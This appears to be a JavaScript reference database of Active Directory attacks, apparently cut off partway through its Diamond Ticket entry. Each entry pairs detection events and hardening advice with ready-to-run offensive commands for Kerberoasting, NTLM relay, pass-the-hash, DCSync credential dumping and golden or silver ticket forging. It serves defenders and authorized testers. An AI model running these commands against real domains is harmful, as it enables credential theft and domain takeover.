// Active Directory Attack & Defense Reference Database
// Educational reference for authorized security testing and defense

export const AD_ATTACKS_DB = [
  // ===== RECONNAISSANCE =====
  {
    name: "LDAP Anonymous Bind Enumeration",
    category: "Reconnaissance",
    description: "Query LDAP directory without authentication to enumerate users, groups, computers, OUs, and domain policy. Anonymous binds are disabled by default in modern AD but legacy configs may allow it.",
    prerequisites: ["Network access to DC port 389/636", "Anonymous bind enabled (legacy)"],
    commands: [
      "ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' '(objectClass=user)' sAMAccountName",
      "ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' '(objectClass=group)' cn member",
      "ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' '(objectClass=computer)' cn operatingSystem",
      "ldapsearch -x -H ldap://DC_IP -s base '' defaultNamingContext",
      "ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' '(&(objectCategory=person)(objectClass=user)(adminCount=1))' sAMAccountName",
      "ldapsearch -x -H ldap://DC_IP -b 'CN=Configuration,DC=domain,DC=com' '(objectClass=site)' cn"
    ],
    tools: ["ldapsearch", "ldapdomaindump", "windapsearch", "ad-ldap-enum"],
    detection: [
      "Monitor Event ID 2889 (LDAP unsigned binds)",
      "Monitor Event ID 2887 (LDAP simple bind statistics)",
      "Watch for high-volume LDAP queries from non-DC sources",
      "Network IDS signature for anonymous LDAP bind attempts"
    ],
    mitre: "T1018, T1087.002",
    prevention: [
      "Disable anonymous LDAP binds (dsHeuristics)",
      "Require LDAP signing (GPO: Domain Controller LDAP server signing requirements)",
      "Enable LDAP channel binding",
      "Use LDAPS (port 636) with TLS certificates",
      "Restrict LDAP access via firewall rules"
    ],
    references: ["https://attack.mitre.org/techniques/T1087/002/"]
  },
  {
    name: "BloodHound / SharpHound Collection",
    category: "Reconnaissance",
    description: "Automated AD relationship mapping using graph theory. SharpHound collects users, groups, sessions, ACLs, trusts, GPOs, and containers. BloodHound visualizes attack paths to high-value targets like Domain Admins.",
    prerequisites: ["Domain user credentials", "Network access to DCs and member servers"],
    commands: [
      "SharpHound.exe -c All --zipfilename output.zip",
      "SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\\temp",
      "SharpHound.exe -c Session --loop --loopduration 02:00:00",
      "Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp",
      "bloodhound-python -u user -p 'pass' -d domain.com -dc dc01.domain.com -c all",
      "rusthound -d domain.com -u user@domain.com -p 'pass' --zip",
      "neo4j console",
      "MATCH (n:User {owned:true})-[r*1..]->(m:Group {name:'DOMAIN ADMINS@DOMAIN.COM'}) RETURN p=shortestPath((n)-[r*1..]->(m))"
    ],
    tools: ["SharpHound", "BloodHound", "bloodhound-python", "RustHound", "AzureHound", "PlumHound", "BloodHound Community Edition"],
    detection: [
      "Event ID 4662 (Directory Service Access) with GUID for container/OU enumeration",
      "Event ID 5145 (Network share access) for SYSVOL/NETLOGON reads",
      "Excessive LDAP queries from a single source in short timeframe",
      "Event ID 4624 Type 3 logons correlated with session enumeration",
      "Monitor for SharpHound.exe or Invoke-BloodHound in command line logging",
      "Sysmon Event ID 1 with SharpHound binary hash",
      "Network traffic analysis for SAMR/LSARPC enumeration"
    ],
    mitre: "T1087.002, T1069.002, T1482",
    prevention: [
      "Restrict privileged group membership visibility",
      "Enable Protected Users group for sensitive accounts",
      "Implement tiered administration model",
      "Monitor and alert on enumeration patterns",
      "Limit net session enumeration (SrvsvcSessionInfo hardening)",
      "Use AdminSDHolder to protect sensitive objects"
    ],
    references: ["https://bloodhound.readthedocs.io/", "https://github.com/BloodHoundAD/BloodHound"]
  },
  {
    name: "PowerView Domain Enumeration",
    category: "Reconnaissance",
    description: "PowerShell-based AD enumeration framework. Part of PowerSploit. Enumerates users, groups, computers, shares, GPOs, ACLs, trusts, and SPNs using native AD protocols.",
    prerequisites: ["Domain user credentials", "PowerShell execution"],
    commands: [
      "Import-Module PowerView.ps1",
      "Get-Domain",
      "Get-DomainController",
      "Get-DomainUser -Identity admin -Properties samaccountname,description,memberof,admincount,lastlogon",
      "Get-DomainUser -SPN | Select samaccountname,serviceprincipalname",
      "Get-DomainUser -UACFilter DONT_REQ_PREAUTH",
      "Get-DomainGroup -Identity 'Domain Admins' -Recurse",
      "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse",
      "Get-DomainComputer -Properties dnshostname,operatingsystem | Sort operatingsystem",
      "Find-DomainShare -CheckShareAccess",
      "Get-DomainGPO | Select displayname,gpcfilesyspath",
      "Get-DomainOU | Select name,gplink",
      "Get-DomainTrust",
      "Get-ForestTrust",
      "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs",
      "Find-InterestingDomainAcl -ResolveGUIDs",
      "Find-LocalAdminAccess",
      "Get-NetSession -ComputerName dc01",
      "Get-DomainForeignGroupMember",
      "Invoke-Kerberoast -OutputFormat Hashcat"
    ],
    tools: ["PowerView", "PowerSploit", "ADModule", "SharpView"],
    detection: [
      "PowerShell ScriptBlock Logging (Event ID 4104) for PowerView cmdlets",
      "AMSI detection of PowerView/PowerSploit modules",
      "Event ID 4662 for excessive directory object access",
      "Event ID 5136 for directory service changes enumeration",
      "Monitor for SAMR and LSARPC named pipe connections"
    ],
    mitre: "T1087.002, T1069.002, T1135",
    prevention: [
      "Enable PowerShell Constrained Language Mode",
      "Deploy AMSI-aware antivirus",
      "Enable PowerShell ScriptBlock and Module logging",
      "Restrict WMI and WinRM access",
      "Implement JEA (Just Enough Administration)"
    ],
    references: ["https://powersploit.readthedocs.io/"]
  },
  {
    name: "SPN Scanning (Service Discovery)",
    category: "Reconnaissance",
    description: "Enumerate Service Principal Names to discover services running in the domain. SPNs are registered in AD for Kerberos authentication. Reveals SQL servers, web servers, Exchange, and other services without port scanning.",
    prerequisites: ["Domain user credentials"],
    commands: [
      "setspn -T domain.com -Q */*",
      "Get-DomainUser -SPN | Select samaccountname,serviceprincipalname",
      "ldapsearch -x -H ldap://DC -b 'DC=domain,DC=com' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName",
      "GetUserSPNs.py domain.com/user:pass -dc-ip DC_IP",
      "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName"
    ],
    tools: ["setspn", "PowerView", "Impacket GetUserSPNs", "ldapsearch"],
    detection: [
      "Event ID 4769 (Kerberos Service Ticket requested) with ticket encryption type 0x17 (RC4)",
      "High volume LDAP queries for servicePrincipalName attribute",
      "Correlation of SPN queries followed by TGS requests"
    ],
    mitre: "T1046, T1087.002",
    prevention: [
      "Use Group Managed Service Accounts (gMSA) instead of user accounts for services",
      "Remove unnecessary SPNs from user accounts",
      "Monitor SPN queries in LDAP logs",
      "Use AES encryption for service accounts (reduces Kerberoast risk)"
    ],
    references: ["https://attack.mitre.org/techniques/T1046/"]
  },
  {
    name: "DNS Zone Transfer / Enumeration",
    category: "Reconnaissance",
    description: "Attempt zone transfer (AXFR) from AD-integrated DNS to dump all DNS records. Even without zone transfer, DNS enumeration reveals hostnames, service records, and network topology.",
    prerequisites: ["Network access to DNS server port 53"],
    commands: [
      "dig @DC_IP domain.com AXFR",
      "dig @DC_IP domain.com ANY",
      "dig @DC_IP _ldap._tcp.domain.com SRV",
      "dig @DC_IP _kerberos._tcp.domain.com SRV",
      "dig @DC_IP _gc._tcp.domain.com SRV",
      "nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com DC_IP",
      "dnsenum --dnsserver DC_IP domain.com",
      "adidnsdump -u domain.com\\\\user -p pass ldap://DC_IP",
      "Get-DnsServerZone -ComputerName dc01 | Select ZoneName",
      "Get-DnsServerResourceRecord -ZoneName domain.com -ComputerName dc01"
    ],
    tools: ["dig", "nslookup", "dnsenum", "dnsrecon", "adidnsdump", "fierce"],
    detection: [
      "DNS server logs showing AXFR attempts",
      "Event ID 6004 (DNS zone transfer)",
      "High volume DNS queries from a single source",
      "Monitor for SRV record queries for AD service discovery"
    ],
    mitre: "T1018, T1046",
    prevention: [
      "Disable zone transfers to non-authorized servers",
      "Restrict zone transfer to specific IP addresses",
      "Use AD-integrated DNS zones (replication via AD replication)",
      "Enable DNS query logging and monitoring"
    ],
    references: ["https://attack.mitre.org/techniques/T1018/"]
  },
  {
    name: "LDAP Password Attribute Mining",
    category: "Reconnaissance",
    description: "Search for passwords stored in LDAP attributes like description, info, comment, or custom attributes. Administrators sometimes store passwords in cleartext in these fields for convenience.",
    prerequisites: ["Domain user credentials"],
    commands: [
      "Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description -match 'pass|pwd|cred'}",
      "ldapsearch -x -H ldap://DC -D 'user@domain.com' -w 'pass' -b 'DC=domain,DC=com' '(objectClass=user)' description info comment",
      "Get-ADUser -Filter * -Properties description,info | Where-Object {$_.description -like '*pass*' -or $_.info -like '*pass*'}",
      "Get-DomainUser -LDAPFilter '(description=*pass*)' -Properties samaccountname,description",
      "Get-DomainComputer -Properties description | Where-Object {$_.description -match 'pass|pwd|cred'}"
    ],
    tools: ["PowerView", "ldapsearch", "ADExplorer", "LDAPDomainDump"],
    detection: [
      "Event ID 4662 with access to description/info attributes",
      "LDAP query patterns filtering on description containing password keywords",
      "Alert on bulk user attribute reads"
    ],
    mitre: "T1552.006",
    prevention: [
      "Audit and remove passwords from LDAP attributes",
      "Use LAPS for local admin passwords",
      "Implement password vaults (CyberArk, HashiCorp Vault)",
      "Regular scanning for credentials in AD attributes"
    ],
    references: ["https://attack.mitre.org/techniques/T1552/006/"]
  },

  // ===== CREDENTIAL ATTACKS =====
  {
    name: "Kerberoasting",
    category: "Credential Attacks",
    description: "Request TGS tickets for accounts with SPNs, then crack the tickets offline. Targets service accounts with weak passwords. RC4-encrypted tickets are fastest to crack; AES tickets are harder but still vulnerable.",
    prerequisites: ["Any domain user account", "Target must have SPN registered"],
    commands: [
      "GetUserSPNs.py domain.com/user:pass -dc-ip DC_IP -request -outputfile hashes.txt",
      "GetUserSPNs.py domain.com/user:pass -dc-ip DC_IP -request -outputfile hashes.txt -target-domain child.domain.com",
      "Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File kerberoast.txt",
      "Rubeus.exe kerberoast /outfile:hashes.txt",
      "Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt",
      "Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt",
      "Rubeus.exe kerberoast /aes /outfile:hashes.txt",
      "hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule",
      "hashcat -m 19700 hashes.txt wordlist.txt  # AES-128",
      "hashcat -m 19800 hashes.txt wordlist.txt  # AES-256",
      "john --format=krb5tgs --wordlist=wordlist.txt hashes.txt"
    ],
    tools: ["Impacket GetUserSPNs", "Rubeus", "Invoke-Kerberoast", "hashcat", "John the Ripper"],
    detection: [
      "Event ID 4769 with ticket encryption type 0x17 (RC4-HMAC) — anomalous if AES is default",
      "Event ID 4769 with service name that is a user account (not a computer account)",
      "Multiple TGS requests from a single source in short succession",
      "Honey accounts: create fake SPN accounts with detectable names and alert on any TGS request",
      "Monitor for Rubeus or Invoke-Kerberoast in command line logging"
    ],
    mitre: "T1558.003",
    prevention: [
      "Use Group Managed Service Accounts (gMSA) — 120+ char random passwords",
      "Enforce AES encryption for service accounts (msDS-SupportedEncryptionTypes = 0x18)",
      "Set strong passwords (25+ chars) on service accounts",
      "Remove unnecessary SPNs from user accounts",
      "Enable Kerberos armoring (FAST)",
      "Implement honey SPN accounts for detection"
    ],
    references: ["https://attack.mitre.org/techniques/T1558/003/"]
  },
  {
    name: "AS-REP Roasting",
    category: "Credential Attacks",
    description: "Request AS-REP for accounts with 'Do not require Kerberos preauthentication' flag set. The response contains encrypted data crackable offline. No SPN required — targets user accounts directly.",
    prerequisites: ["List of target usernames", "Network access to KDC (port 88)"],
    commands: [
      "GetNPUsers.py domain.com/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt",
      "GetNPUsers.py domain.com/user:pass -request -dc-ip DC_IP",
      "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
      "Rubeus.exe asreproast /user:targetuser /format:hashcat",
      "Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select samaccountname",
      "hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule",
      "john --format=krb5asrep --wordlist=wordlist.txt asrep.txt",
      "kerbrute userenum --dc DC_IP -d domain.com users.txt"
    ],
    tools: ["Impacket GetNPUsers", "Rubeus", "PowerView", "hashcat", "kerbrute"],
    detection: [
      "Event ID 4768 with result code 0x0 and preauth type missing",
      "Event ID 4768 with encryption type 0x17 (RC4)",
      "Multiple AS-REQ from single source for different accounts",
      "Honey accounts: flag accounts with DONT_REQ_PREAUTH and monitor"
    ],
    mitre: "T1558.004",
    prevention: [
      "Remove DONT_REQ_PREAUTH flag from all accounts",
      "Audit accounts with this flag regularly: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True}",
      "Enforce strong passwords on any accounts that must have this flag",
      "Monitor for AS-REP requests without preauthentication"
    ],
    references: ["https://attack.mitre.org/techniques/T1558/004/"]
  },
  {
    name: "Password Spraying",
    category: "Credential Attacks",
    description: "Try a small number of common passwords against many accounts. Avoids account lockout by staying under the threshold. Effective against organizations with weak password policies.",
    prerequisites: ["List of valid domain usernames", "Knowledge of password policy (lockout threshold, observation window)"],
    commands: [
      "crackmapexec smb DC_IP -u users.txt -p 'Spring2024!' --continue-on-success",
      "crackmapexec smb DC_IP -u users.txt -p passwords.txt --no-bruteforce",
      "kerbrute passwordspray --dc DC_IP -d domain.com users.txt 'Spring2024!'",
      "Invoke-DomainPasswordSpray -UserList users.txt -Password 'Spring2024!' -Domain domain.com",
      "spray.sh -smb DC_IP users.txt 'Spring2024!' 1 domain.com",
      "Get-ADDefaultDomainPasswordPolicy | Select LockoutThreshold,LockoutObservationWindow",
      "net accounts /domain"
    ],
    tools: ["CrackMapExec/NetExec", "kerbrute", "Spray", "DomainPasswordSpray", "Ruler"],
    detection: [
      "Event ID 4771 (Kerberos pre-authentication failed) — multiple for same password",
      "Event ID 4625 (Failed logon) — single password across many accounts",
      "Event ID 4776 (NTLM credential validation) with error code 0xC000006A",
      "Statistical anomaly: many auth failures with same timestamp pattern",
      "Azure AD Sign-In logs with error code 50126 (invalid password)"
    ],
    mitre: "T1110.003",
    prevention: [
      "Enforce strong password policies (15+ chars, complexity)",
      "Implement smart lockout (Azure AD) or progressive delays",
      "Use banned password lists (Azure AD Password Protection)",
      "Deploy MFA for all accounts",
      "Monitor and alert on spray patterns",
      "Implement fine-grained password policies for sensitive accounts"
    ],
    references: ["https://attack.mitre.org/techniques/T1110/003/"]
  },
  {
    name: "LLMNR / NBT-NS / mDNS Poisoning",
    category: "Credential Attacks",
    description: "Respond to LLMNR (UDP 5355), NBT-NS (UDP 137), and mDNS (UDP 5353) broadcast name resolution requests with attacker IP. Victim authenticates to attacker, revealing NTLMv2 hash or enabling relay attacks.",
    prerequisites: ["Same network segment as victim", "LLMNR/NBT-NS not disabled"],
    commands: [
      "responder -I eth0 -wrfbud",
      "responder -I eth0 -A  # Analyze mode (passive)",
      "Inveigh.exe",
      "Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -ConsoleOutput Y -FileOutput Y",
      "hashcat -m 5600 hashes.txt wordlist.txt  # NTLMv2",
      "hashcat -m 5500 hashes.txt wordlist.txt  # NTLMv1",
      "ntlmrelayx.py -t smb://TARGET_IP -smb2support"
    ],
    tools: ["Responder", "Inveigh", "Impacket ntlmrelayx", "MultiRelay", "hashcat"],
    detection: [
      "Network monitoring for LLMNR/NBT-NS responses from non-DNS servers",
      "Detect multiple name resolution responses from a single host",
      "Honey accounts: create shares that trigger LLMNR lookups and monitor",
      "Event ID 4624 Type 3 logons from unexpected sources",
      "NTLM authentication from workstations to non-standard destinations"
    ],
    mitre: "T1557.001",
    prevention: [
      "Disable LLMNR via GPO: Computer Configuration > Administrative Templates > Network > DNS Client > Turn Off Multicast Name Resolution",
      "Disable NBT-NS via DHCP option or network adapter settings",
      "Disable mDNS via GPO",
      "Enforce SMB signing to prevent relay attacks",
      "Deploy EPA (Extended Protection for Authentication)",
      "Enable LDAP signing and channel binding",
      "Segment networks to limit broadcast domain exposure"
    ],
    references: ["https://attack.mitre.org/techniques/T1557/001/"]
  },
  {
    name: "NTLM Relay Attack",
    category: "Credential Attacks",
    description: "Intercept NTLM authentication and relay it to another service. Unlike cracking, relay uses the authentication in real-time. Can escalate to domain admin via relay to LDAP for shadow credentials or RBCD.",
    prerequisites: ["Man-in-the-middle position", "SMB signing disabled on target", "NTLM authentication in use"],
    commands: [
      "ntlmrelayx.py -t smb://TARGET -smb2support",
      "ntlmrelayx.py -t ldap://DC --escalate-user attacker",
      "ntlmrelayx.py -t ldaps://DC --delegate-access --escalate-user attacker",
      "ntlmrelayx.py -t ldaps://DC --shadow-credentials --shadow-target DC$",
      "ntlmrelayx.py -t http://ADCS/certsrv/certfnsh.asp --adcs --template DomainController",
      "ntlmrelayx.py -t smb://TARGET -socks",
      "ntlmrelayx.py -tf targets.txt --no-http-server -smb2support",
      "PetitPotam.py LISTENER_IP DC_IP  # Coerce DC auth",
      "python3 printerbug.py domain.com/user:pass@DC LISTENER_IP  # PrinterBug/SpoolSample",
      "Coercer.py -u user -p pass -d domain.com -l LISTENER_IP -t DC_IP"
    ],
    tools: ["Impacket ntlmrelayx", "Responder", "PetitPotam", "PrinterBug", "Coercer", "DFSCoerce", "ShadowCoerce"],
    detection: [
      "Event ID 4624 Type 3 with network logon from unexpected source",
      "NTLM authentication to sensitive services (LDAP, ADCS) from workstations",
      "Event ID 4742 (computer account changed) — RBCD delegation added",
      "Event ID 5136 (directory service object modified) — msDS-AllowedToActOnBehalfOfOtherIdentity",
      "Monitor for PetitPotam/PrinterBug coercion on DCs (EFSRPC, Print Spooler)"
    ],
    mitre: "T1557.001, T1187",
    prevention: [
      "Enforce SMB signing on all systems via GPO",
      "Enable LDAP signing and LDAP channel binding",
      "Enable EPA on all web services (IIS, ADCS, Exchange)",
      "Disable NTLM where possible (Kerberos only)",
      "Restrict NTLM via GPO: Restrict NTLM: NTLM authentication in this domain",
      "Disable Print Spooler on DCs",
      "Patch PetitPotam (KB5005413) and enforce EPA on ADCS",
      "Enable Extended Protection for Authentication on ADCS"
    ],
    references: ["https://attack.mitre.org/techniques/T1557/001/"]
  },
  {
    name: "Pass-the-Hash (PtH)",
    category: "Credential Attacks",
    description: "Authenticate using the NTLM hash directly without knowing the plaintext password. Works because NTLM authentication uses the hash as a shared secret. Effective against local admin accounts and service accounts.",
    prerequisites: ["NTLM hash of target account", "Target service accepts NTLM authentication"],
    commands: [
      "crackmapexec smb TARGET -u admin -H 'aad3b435b51404eeaad3b435b51404ee:HASH'",
      "crackmapexec smb TARGET -u admin -H HASH --exec-method smbexec -x 'whoami'",
      "psexec.py domain.com/admin@TARGET -hashes :HASH",
      "wmiexec.py domain.com/admin@TARGET -hashes :HASH",
      "smbexec.py domain.com/admin@TARGET -hashes :HASH",
      "atexec.py domain.com/admin@TARGET -hashes :HASH 'whoami'",
      "evil-winrm -i TARGET -u admin -H HASH",
      "xfreerdp /v:TARGET /u:admin /pth:HASH",
      "mimikatz.exe 'sekurlsa::pth /user:admin /domain:domain.com /ntlm:HASH /run:cmd.exe'"
    ],
    tools: ["CrackMapExec/NetExec", "Impacket (psexec/wmiexec/smbexec)", "Mimikatz", "evil-winrm", "xfreerdp"],
    detection: [
      "Event ID 4624 Type 3 with NtLmSsp and LogonProcessName NTLM",
      "Event ID 4624 where LogonType=9 (NewCredentials) — Mimikatz sekurlsa::pth",
      "Key Length of 0 in 4624 events (NTLMv1) or non-standard key lengths",
      "Correlation: 4624 Type 3 without corresponding 4648 (explicit credentials)",
      "Monitor for known PtH tool artifacts in process creation (4688)"
    ],
    mitre: "T1550.002",
    prevention: [
      "Implement Credential Guard (Windows 10/Server 2016+)",
      "Use Protected Users group for admin accounts",
      "Disable NTLM where possible",
      "Implement LAPS to randomize local admin passwords",
      "Deploy Local Admin Password Solution (LAPS) or Windows LAPS",
      "Use Restricted Admin mode for RDP",
      "Implement tiered administration to limit hash exposure"
    ],
    references: ["https://attack.mitre.org/techniques/T1550/002/"]
  },
  {
    name: "Pass-the-Ticket (PtT)",
    category: "Credential Attacks",
    description: "Inject a stolen Kerberos ticket (TGT or TGS) into the current session to authenticate as another user. Unlike PtH, works with Kerberos-only environments. Can use tickets exported from memory or forged.",
    prerequisites: ["Kerberos ticket (from memory dump or ticket forging)", "Network access to target service"],
    commands: [
      "mimikatz.exe 'kerberos::list /export'",
      "mimikatz.exe 'kerberos::ptt ticket.kirbi'",
      "Rubeus.exe ptt /ticket:ticket.kirbi",
      "Rubeus.exe dump /service:krbtgt /luid:0x12345 /nowrap",
      "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /show",
      "Rubeus.exe ptt /ticket:base64ticket",
      "export KRB5CCNAME=/tmp/ticket.ccache  # Linux",
      "getTGT.py domain.com/user:pass -dc-ip DC_IP",
      "getST.py domain.com/user:pass -spn cifs/target.domain.com -dc-ip DC_IP",
      "klist  # Verify injected tickets",
      "klist purge  # Clear ticket cache"
    ],
    tools: ["Mimikatz", "Rubeus", "Impacket (getTGT/getST)", "Kekeo"],
    detection: [
      "Event ID 4768 (TGT request) — compare with source of ticket usage",
      "Event ID 4769 (TGS request) from account not matching original TGT source",
      "Ticket used from different IP than where it was issued",
      "Anomalous Kerberos activity from service accounts",
      "Monitor for Mimikatz/Rubeus in command-line auditing"
    ],
    mitre: "T1550.003",
    prevention: [
      "Implement Credential Guard",
      "Use Protected Users group",
      "Reduce TGT lifetime (default 10 hours)",
      "Monitor for anomalous Kerberos ticket usage",
      "Implement Kerberos armoring (FAST)"
    ],
    references: ["https://attack.mitre.org/techniques/T1550/003/"]
  },
  {
    name: "Overpass-the-Hash (Pass-the-Key)",
    category: "Credential Attacks",
    description: "Use an NTLM hash or AES key to request a legitimate Kerberos TGT. Converts an NTLM hash into a Kerberos ticket, enabling Kerberos-only authentication. More stealthy than PtH as it uses Kerberos.",
    prerequisites: ["NTLM hash or AES256/AES128 key of target account"],
    commands: [
      "Rubeus.exe asktgt /user:admin /rc4:HASH /ptt",
      "Rubeus.exe asktgt /user:admin /aes256:KEY /ptt /opsec",
      "Rubeus.exe asktgt /user:admin /aes256:KEY /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt",
      "mimikatz.exe 'sekurlsa::pth /user:admin /domain:domain.com /ntlm:HASH /run:cmd.exe'",
      "getTGT.py domain.com/admin -hashes :HASH -dc-ip DC_IP",
      "getTGT.py domain.com/admin -aesKey AES256KEY -dc-ip DC_IP"
    ],
    tools: ["Rubeus", "Mimikatz", "Impacket getTGT"],
    detection: [
      "Event ID 4768 with encryption type 0x17 (RC4) when AES is the norm",
      "Event ID 4768 from unexpected source IP for the account",
      "TGT request without prior interactive logon on that system",
      "Anomalous authentication patterns for service accounts"
    ],
    mitre: "T1550.002",
    prevention: [
      "Monitor for RC4 TGT requests (encryption downgrade)",
      "Implement Credential Guard",
      "Use Protected Users group (forces AES, prevents NTLM)",
      "Enable Kerberos AES-only via msDS-SupportedEncryptionTypes"
    ],
    references: ["https://attack.mitre.org/techniques/T1550/002/"]
  },

  // ===== PRIVILEGE ESCALATION =====
  {
    name: "DCSync Attack",
    category: "Privilege Escalation",
    description: "Impersonate a Domain Controller and request password data via the MS-DRSR (Directory Replication Service) protocol. Extracts NTLM hashes, Kerberos keys, and password history for any account including krbtgt.",
    prerequisites: ["Account with Replicating Directory Changes and Replicating Directory Changes All permissions (Domain Admins, Enterprise Admins, or accounts with these rights delegated)"],
    commands: [
      "secretsdump.py domain.com/admin:pass@DC_IP -just-dc",
      "secretsdump.py domain.com/admin:pass@DC_IP -just-dc-user krbtgt",
      "secretsdump.py domain.com/admin:pass@DC_IP -just-dc-ntlm",
      "mimikatz.exe 'lsadump::dcsync /domain:domain.com /user:krbtgt'",
      "mimikatz.exe 'lsadump::dcsync /domain:domain.com /all /csv'",
      "mimikatz.exe 'lsadump::dcsync /domain:domain.com /user:Administrator'",
      "# Check who has DCSync rights:",
      "Get-DomainObjectAcl 'DC=domain,DC=com' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replicating' -and $_.ActiveDirectoryRights -match 'ExtendedRight'}"
    ],
    tools: ["Impacket secretsdump", "Mimikatz", "DSInternals"],
    detection: [
      "Event ID 4662 with GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)",
      "Event ID 4662 with GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)",
      "Event ID 4662 from non-DC source (critical — DCSync from workstation)",
      "DRS RPC connections from non-DC IP addresses",
      "Monitor directory replication traffic on non-DC systems"
    ],
    mitre: "T1003.006",
    prevention: [
      "Audit and restrict accounts with Replicating Directory Changes permissions",
      "Remove unnecessary DCSync rights from non-DC accounts",
      "Monitor Event ID 4662 for replication GUIDs from non-DC sources",
      "Implement tiered administration",
      "Use AdminSDHolder to protect critical accounts"
    ],
    references: ["https://attack.mitre.org/techniques/T1003/006/"]
  },
  {
    name: "Golden Ticket Attack",
    category: "Privilege Escalation",
    description: "Forge a TGT using the krbtgt account's NTLM hash or AES key. The forged ticket grants access to any service in the domain and can have arbitrary group memberships, user ID, and lifetime (up to 10 years).",
    prerequisites: ["krbtgt NTLM hash or AES key (from DCSync or NTDS.dit extraction)", "Domain SID"],
    commands: [
      "mimikatz.exe 'kerberos::golden /user:fakeadmin /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt'",
      "mimikatz.exe 'kerberos::golden /user:fakeadmin /domain:domain.com /sid:S-1-5-21-xxx /aes256:KEY /ptt'",
      "mimikatz.exe 'kerberos::golden /user:fakeadmin /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /groups:512,519,513 /ptt'",
      "ticketer.py -nthash HASH -domain-sid S-1-5-21-xxx -domain domain.com fakeadmin",
      "ticketer.py -aesKey KEY -domain-sid S-1-5-21-xxx -domain domain.com fakeadmin",
      "Rubeus.exe golden /rc4:HASH /user:fakeadmin /domain:domain.com /sid:S-1-5-21-xxx /ptt",
      "export KRB5CCNAME=fakeadmin.ccache  # Use on Linux",
      "psexec.py domain.com/fakeadmin@DC -k -no-pass"
    ],
    tools: ["Mimikatz", "Impacket ticketer", "Rubeus"],
    detection: [
      "Event ID 4769 for accounts that do not exist in AD",
      "Event ID 4769 with abnormally long ticket lifetime",
      "TGS request without prior TGT request (Event ID 4768)",
      "Mismatch between account name in ticket and actual AD account",
      "Event ID 4624 with SID mismatch",
      "Microsoft ATA/Defender for Identity golden ticket detection"
    ],
    mitre: "T1558.001",
    prevention: [
      "Reset krbtgt password twice (to invalidate both current and previous keys)",
      "Reduce krbtgt password age (reset every 180 days minimum)",
      "Enable PAC validation on all services",
      "Deploy Defender for Identity / ATA for golden ticket detection",
      "Implement Kerberos armoring (FAST)",
      "Monitor for anomalous Kerberos ticket lifetimes"
    ],
    references: ["https://attack.mitre.org/techniques/T1558/001/"]
  },
  {
    name: "Silver Ticket Attack",
    category: "Privilege Escalation",
    description: "Forge a TGS ticket for a specific service using the service account's NTLM hash. Unlike golden tickets, silver tickets don't touch the DC — they go directly to the target service. Harder to detect.",
    prerequisites: ["NTLM hash or AES key of the target service account", "Service SPN", "Domain SID"],
    commands: [
      "mimikatz.exe 'kerberos::golden /user:fakeuser /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:HASH /ptt'",
      "mimikatz.exe 'kerberos::golden /user:fakeuser /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:http /rc4:HASH /ptt'",
      "ticketer.py -nthash HASH -domain-sid S-1-5-21-xxx -domain domain.com -spn cifs/server.domain.com fakeuser",
      "Rubeus.exe silver /service:cifs/server.domain.com /rc4:HASH /user:fakeuser /domain:domain.com /sid:S-1-5-21-xxx /ptt",
      "# Common SPNs for silver tickets:",
      "# cifs/host — file share access",
      "# http/host — web service access",
      "# mssql/host — SQL Server access",
      "# ldap/host — LDAP/DCSync on DC",
      "# host/host — WMI, scheduled tasks, PSRemoting"
    ],
    tools: ["Mimikatz", "Impacket ticketer", "Rubeus"],
    detection: [
      "No Event ID 4768 (TGT request) on DC preceding the TGS use",
      "Event ID 4624 with encrypted timestamp mismatch",
      "PAC validation failures on the target service",
      "Enable PAC validation to force ticket verification against DC",
      "Anomalous service access patterns for non-existent users"
    ],
    mitre: "T1558.002",
    prevention: [
      "Enable PAC validation on services",
      "Use gMSA with regular password rotation",
      "Reset computer account passwords regularly",
      "Monitor for service access without corresponding DC authentication",
      "Implement tiered administration"
    ],
    references: ["https://attack.mitre.org/techniques/T1558/002/"]
  },
  {
    name: "Diamond Ticket Attack",
    category: "Privilege Escalation",
    description: "Modify a legitimate TGT's PAC (Privilege Attribute Certificate) after decrypting it with the krbtgt key. More stealthy than golden tickets because it modifies a real ticket rather than forging one from scratch.",
    prerequisites: ["krbtgt AES key", "Valid domain user account to request initial TGT"],
    commands: [
      "Rubeus.exe diamond /krbkey:AES256KEY /user:targetuser /password:pass /enctype:aes /ticketuser:fakeadmin /ticketuserid:500 /groups:512 /ptt",
      "Rubeus.exe diamond /krbkey:AES256KEY /tgtdeleg /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt",
      "ticketer.py -aesKey KEY -domain-sid S-1-5-21-xxx -domain domain.com -user-id 500 -groups 512 Administrator"
    ],
    tools: ["Rubeus", "Impacket ticketer"],
    detection: [
      "Event ID 4768 followed by TGS requests with modified PAC",
      "PAC content mismatch between TGT and account properties in AD",
